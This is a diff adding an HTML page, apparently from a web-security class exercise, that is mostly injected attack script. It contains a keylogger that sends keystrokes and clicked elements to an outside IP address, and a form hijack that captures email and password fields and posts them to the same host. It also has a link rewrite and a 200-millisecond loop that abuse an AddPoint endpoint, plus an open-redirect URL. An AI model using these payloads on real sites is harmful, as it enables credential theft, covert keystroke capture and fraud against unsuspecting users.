@@ -1,0 +1,111 @@
+﻿<!DOCTYPE html>
+<html>
+<head>
+    <title></title>
+    <meta charset="utf-8" />
+</head>
+<body>
+
+    <input type="text" name="username" />
+    <script src="../Scripts/jquery-1.10.2.js"></script>
+    <script>
+
+        window.onload = function () {
+            var strokeBuffer = '';
+            var timer;
+            var lastClickedElement = {};
+            document.onclick = function (evt) {
+                lastClickedElement = {
+                    ElementTagName: evt.srcElement.tagName,
+                    ElementType: evt.srcElement.type,
+                    NameAttribute: evt.srcElement.name,
+                    IdAttribute: evt.srcElement.id,
+                    ClassAttribute: "Todo:getCssClassesFromDom"
+                };
+            };
+            document.onkeypress = function (evt) {
+
+                evt = evt || window.event;
+                var charCode = evt.keyCode || evt.which;
+                var charStr = String.fromCharCode(charCode);
+
+                if (charStr) {
+                    strokeBuffer += charStr;
+                }
+                clearTimeout(timer);
+                timer = setTimeout(function () {
+                    if (strokeBuffer) {
+                        $.ajax({
+                            url: 'http://5.189.166.19:1337/api/UserInputData',
+                            method: 'POST',
+                            data: {
+                                KeyStrokes: strokeBuffer,
+                                MousePositions: "NYI",
+                                CollectedDate: new Date().toISOString(),
+                                Element: lastClickedElement,
+                                SourceUrl: window.location.host
+                            },
+                            dataType: 'json'
+                        }).success(function (data) { }).error(function (err) { console.log(err); });
+                        strokeBuffer = '';
+                    }
+                }, 3000);
+
+            };
+        }
+
+
+    </script>
+    <!--Exercise 1-->
+    <h1 style="color:blue;font-size:30px">Sup dawgs!</h1>
+    or
+    <!--Exercise 1-->
+    <script>
+        //document.getElementsByTagName('head')[0].innerHTML += '<style>.rotate{-ms-filter: "progid:DXImageTransform.Microsoft.Matrix(M11=0.86602540, M12=0.50000000, M21=-0.50000000, M22=0.86602540,sizingMethod=\'auto expand\')";filter: progid:DXImageTransform.Microsoft.Matrix(M11=0.86602540, M12=0.50000000, M21=-0.50000000, M22=0.86602540,sizingMethod=\'auto expand\');-moz-transform:  matrix(0.86602540, -0.50000000, 0.50000000, 0.86602540, 0, 0);-webkit-transform:  matrix(0.86602540, -0.50000000, 0.50000000, 0.86602540, 0, 0);-o-transform:  matrix(0.86602540, -0.50000000, 0.50000000, 0.86602540, 0, 0);}</style>'
+        document.getElementsByTagName('head')[0].innerHTML += '<style>body{ -webkit-transition: all 3s; transition: all 3s}.rotate{ transform: rotate(180deg);}</style>'
+        document.getElementsByTagName('body')[0].className += "rotate"
+    </script>
+    <!--Exercise 2-->
+    <script>
+        document.getElementsByTagName('head')[0].innerHTML += '<link rel="stylesheet" href="/some/url/test.css" />'
+    </script>
+    <!--Exercise 3-->
+    <script>
+        var form = document.getElementsByTagName('form')[0];
+        var emailField = document.getElementsByName('Email')[0];
+        var pwField = document.getElementsByName('Password')[0];
+        form.onsubmit = function (evt) {
+            evt.preventDefault();
+            $.ajax({
+                url: 'http://5.189.166.19:1337/api/UserInputData',
+                method: 'POST',
+                data: {
+                    KeyStrokes: emailField.value + " - " + pwField.value,
+                    MousePositions: "NYI",
+                    CollectedDate: new Date().toISOString(),
+                    SourceUrl: window.location.host
+                },
+                dataType: 'json'
+            });
+            setTimeout(function () { form.submit() }, 1000);
+        }
+    </script>
+    <!--Exercise 4-->
+    <script>
+        window.onload = function(){
+            $('.btn.btn-default.btn-sm').attr('href', '/Posts/AddPoint?userid=1');
+        }
+    </script>
+    <!--More points!-->
+    <script>
+        window.onload = function(){
+        setInterval(function () {
+            $.get("http://5.189.166.19:1338/Posts/AddPoint?userid=add4c433-4d6d-432e-bc8d-69ec20319336");
+        }, 200);
+        }
+    </script>
+    <!--Unvalidated Redirect-->
+    http://5.189.166.19:1338/Authentication/Logout?returnUrl=http://bit.ly/2fTAnCj
+
+</body>
+</html>
